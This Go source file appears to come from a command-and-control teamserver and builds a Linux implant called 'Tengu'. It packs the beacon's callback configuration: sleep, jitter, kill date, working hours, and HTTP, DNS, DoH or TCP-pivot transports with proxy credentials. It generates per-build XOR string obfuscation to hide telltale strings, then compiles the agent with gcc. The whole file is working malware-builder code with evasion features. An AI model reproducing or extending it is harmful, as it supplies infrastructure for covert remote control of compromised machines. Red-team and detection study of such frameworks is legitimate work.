package builder

import (
	"bytes"
	crand "crypto/rand"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"Mugen/pkg/common"
	"Mugen/pkg/common/packer"
	"Mugen/pkg/handlers"
	"Mugen/pkg/logger"
	"Mugen/pkg/utils"
)

const (
	TenguPayloadDir  = "payloads"
	TenguPayloadName = "tengu"

	FILETYPE_LINUX_ELF = 10
)

type TenguBuilder struct {
	sourcePath    string
	outputPath    string
	CompileDir    string
	FileExtension string
	ClientId      string

	config struct {
		ListenerType   int
		ListenerConfig any
		Config         map[string]any
	}

	SendConsoleMessage func(MsgType, Message string)
}

func NewTenguBuilder() *TenguBuilder {
	b := new(TenguBuilder)
	b.sourcePath = utils.GetTeamserverPath() + "/" + TenguPayloadDir + "/Tengu"
	return b
}

func (b *TenguBuilder) SetListener(Type int, Config any) {
	b.config.ListenerType = Type
	b.config.ListenerConfig = Config
}

func (b *TenguBuilder) SetConfig(Config map[string]any) {
	b.config.Config = Config
}

func (b *TenguBuilder) SetExtension(ext string) {
	b.FileExtension = ext
}

// TenguPatchConfig packs the Tengu agent config using the LE packer.
// Layout (all LE): [Sleep:4B][Jitter:4B][Host:len+str][Port:4B][URI:len+str][Secure:4B]
func (b *TenguBuilder) TenguPatchConfig() ([]byte, error) {
	var (
		cfg    = packer.NewPacker(nil, nil)
		sleep  int
		jitter int
		err    error
	)

	if val, ok := b.config.Config["Sleep"].(string); ok {
		sleep, err = strconv.Atoi(val)
		if err != nil {
			return nil, errors.New("failed to parse Sleep: " + err.Error())
		}
	}

	if val, ok := b.config.Config["Jitter"].(string); ok {
		jitter, err = strconv.Atoi(val)
		if err != nil {
			return nil, errors.New("failed to parse Jitter: " + err.Error())
		}
	}

	cfg.AddInt(sleep)
	cfg.AddInt(jitter)

	var killDate int64 = 0
	if val, ok := b.config.Config["KillDate"].(string); ok && val != "" {
		if t, err := time.Parse("2006-01-02", val); err == nil {
			killDate = t.Unix()
		}
	}
	cfg.AddInt64(killDate)

	workingHours, _ := common.ParseWorkingHours(func() string {
		if val, ok := b.config.Config["WorkingHours"].(string); ok {
			return val
		}
		return ""
	}())
	cfg.AddInt32(workingHours)

	switch b.config.ListenerType {
	case handlers.LISTENER_PIVOT_TCP:
		tcpCfg := b.config.ListenerConfig.(*handlers.TCP)
		cfg.AddInt(3) // transport = TCP
		cfg.AddString(tcpCfg.Config.PivotHost)
		cfg.AddInt(tcpCfg.Config.PivotPort)

	case handlers.LISTENER_DNS:
		dnsCfg := b.config.ListenerConfig.(*handlers.DNS)
		cfg.AddInt(1) // transport = DNS
		cfg.AddString(dnsCfg.Config.BindHost)
		cfg.AddInt(dnsCfg.Config.BindPort)
		cfg.AddString(dnsCfg.Config.Domain)

	case handlers.LISTENER_DOH:
		dohCfg := b.config.ListenerConfig.(*handlers.DoH)
		port, _ := strconv.Atoi(dohCfg.Config.PortBind)
		secure := 0
		if dohCfg.Config.Secure {
			secure = 1
		}
		cfg.AddInt(2) // transport = DoH
		cfg.AddString(common.GetInterfaceIpv4Addr(dohCfg.Config.BindHost))
		cfg.AddInt(port)
		cfg.AddString("/dns-query")
		cfg.AddInt(secure)

	case handlers.LISTENER_HTTP:
		cfg.AddInt(0) // transport = HTTP

		httpCfg := b.config.ListenerConfig.(*handlers.HTTP)

		var (
			host string
			port int
		)

		if len(httpCfg.Config.Hosts) > 0 {
			parts := strings.Split(httpCfg.Config.Hosts[0], ":")
			host = common.GetInterfaceIpv4Addr(parts[0])
			if len(parts) > 1 {
				port, _ = strconv.Atoi(parts[1])
			}
		}

		if port == 0 {
			if httpCfg.Config.PortConn != "" {
				port, _ = strconv.Atoi(httpCfg.Config.PortConn)
			}
			if port == 0 {
				port, _ = strconv.Atoi(httpCfg.Config.PortBind)
			}
		}

		if host == "" {
			host = common.GetInterfaceIpv4Addr(httpCfg.Config.HostBind)
		}

		uri := "/"
		if len(httpCfg.Config.Uris) > 0 {
			uri = httpCfg.Config.Uris[0]
		}

		secure := 0
		if httpCfg.Config.Secure {
			secure = 1
		}

		userAgent := httpCfg.Config.UserAgent
		if userAgent == "" {
			userAgent = "Mozilla/5.0"
		}

		cfg.AddString(host)
		cfg.AddInt(port)
		cfg.AddString(uri)
		cfg.AddInt(secure)
		cfg.AddString(userAgent)

	default:
		return nil, errors.New("unsupported listener type for Tengu")
	}

	/* proxy section - appended for all transport types */
	proxyHost, _ := b.config.Config["ProxyHost"].(string)
	if proxyHost != "" {
		proxyPort, _ := strconv.Atoi(b.config.Config["ProxyPort"].(string))
		proxyTypeStr, _ := b.config.Config["ProxyType"].(string)
		proxyType := 0
		if proxyTypeStr == "SOCKS5" {
			proxyType = 1
		}
		proxyUser, _ := b.config.Config["ProxyUser"].(string)
		proxyPass, _ := b.config.Config["ProxyPass"].(string)

		cfg.AddInt(1) // has_proxy
		cfg.AddString(proxyHost)
		cfg.AddInt(proxyPort)
		cfg.AddInt(proxyType)
		if proxyUser != "" {
			cfg.AddInt(1) // has_auth
			cfg.AddString(proxyUser)
			cfg.AddString(proxyPass)
		} else {
			cfg.AddInt(0) // no auth
		}
	} else {
		cfg.AddInt(0) // no proxy
	}

	return cfg.Build(), nil
}

// xorStr XOR-encrypts each byte of s with key and returns comma-separated hex literals.
func xorStr(s string, key byte) string {
	parts := make([]string, len(s))
	for i, c := range []byte(s) {
		parts[i] = fmt.Sprintf("0x%02x", c^key)
	}
	return strings.Join(parts, ",")
}

// genObfStrHeader generates obfstr_data.h with a per-build XOR key and
// pre-encrypted string constants consumed by the SXOR macro in obfstr.h.
func genObfStrHeader(key byte) string {
	type entry struct{ name, val string }
	strs := []entry{
		{"SXOR_PROC_MAPS", "/proc/self/maps"},
		{"SXOR_PROC_EXE", "/proc/self/exe"},
		{"SXOR_NANOSLEEP", "nanosleep"},
		{"SXOR_MPROTECT", "mprotect"},
		{"SXOR_SEM_POST", "sem_post"},
		{"SXOR_SEM_WAIT", "sem_wait"},
		{"SXOR_URANDOM", "/dev/urandom"},
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("#define SXOR_KEY 0x%02x\n", key))
	for _, e := range strs {
		sb.WriteString(fmt.Sprintf("#define %s %s\n", e.name, xorStr(e.val, key)))
	}
	return sb.String()
}

// Build compiles the Tengu Linux ELF agent.
func (b *TenguBuilder) Build() bool {
	var err error

	b.CompileDir, err = os.MkdirTemp("", "tengu-build-*")
	if err != nil {
		b.SendConsoleMessage("Error", "failed to create temp dir: "+err.Error())
		return false
	}

	if b.outputPath == "" {
		b.outputPath = b.CompileDir + "/" + TenguPayloadName + b.FileExtension
	}

	b.SendConsoleMessage("Info", "packing Tengu config")
	cfg, err := b.TenguPatchConfig()
	if err != nil {
		b.SendConsoleMessage("Error", err.Error())
		return false
	}
	b.SendConsoleMessage("Info", fmt.Sprintf("config size [%d bytes]", len(cfg)))

	// Encode config as a C byte array for -DCONFIG_BYTES.
	var sb strings.Builder
	sb.WriteByte('{')
	for i, v := range cfg {
		if i > 0 {
			sb.WriteByte(',')
		}
		sb.WriteString(fmt.Sprintf("0x%02x", v))
	}
	sb.WriteByte('}')
	array := sb.String()

	// Generate per-build string obfuscation header.
	var keyBuf [1]byte
	crand.Read(keyBuf[:])
	sxorKey := keyBuf[0]
	if sxorKey == 0 {
		sxorKey = 0x42
	}
	obfHeaderPath := b.CompileDir + "/obfstr_data.h"
	if err = os.WriteFile(obfHeaderPath, []byte(genObfStrHeader(sxorKey)), 0600); err != nil {
		b.SendConsoleMessage("Error", "failed to write obfstr header: "+err.Error())
		return false
	}

	// Gather source files.
	srcFiles, err := gatherCSources(b.sourcePath + "/src")
	if err != nil {
		b.SendConsoleMessage("Error", "failed to find sources: "+err.Error())
		return false
	}

	compileCmd := fmt.Sprintf(
		"gcc -Os -s -fPIE -pie %s -I%s/include -include %s '-DCONFIG_BYTES=%s' -o %s -lcurl -lpthread -ldl",
		strings.Join(srcFiles, " "),
		b.sourcePath,
		obfHeaderPath,
		array,
		b.outputPath,
	)

	logger.Debug("Tengu compile cmd: " + compileCmd)
	b.SendConsoleMessage("Info", "compiling Tengu agent")

	if !b.execCmd(compileCmd) {
		return false
	}

	b.SendConsoleMessage("Info", "finished compiling Tengu agent")
	return true
}

func (b *TenguBuilder) execCmd(cmd string) bool {
	var (
		Command = exec.Command("sh", "-c", cmd)
		stdout  bytes.Buffer
		stderr  bytes.Buffer
	)

	Command.Stdout = &stdout
	Command.Stderr = &stderr

	if err := Command.Run(); err != nil {
		logger.Error("Tengu compile failed: " + err.Error())
		b.SendConsoleMessage("Error", "compile failed: "+err.Error())
		b.SendConsoleMessage("Error", "stderr: "+stderr.String())
		return false
	}

	return true
}

func gatherCSources(dir string) ([]string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	var files []string
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".c") {
			files = append(files, dir+"/"+e.Name())
		}
	}
	return files, nil
}

func (b *TenguBuilder) GetPayloadBytes() []byte {
	data, err := os.ReadFile(b.outputPath)
	if err != nil {
		b.SendConsoleMessage("Error", "couldn't read Tengu payload: "+err.Error())
		return nil
	}
	b.SendConsoleMessage("Good", "Tengu payload generated")
	return data
}

func (b *TenguBuilder) DeletePayload() {
	os.Remove(b.outputPath)
	os.RemoveAll(b.CompileDir)
}
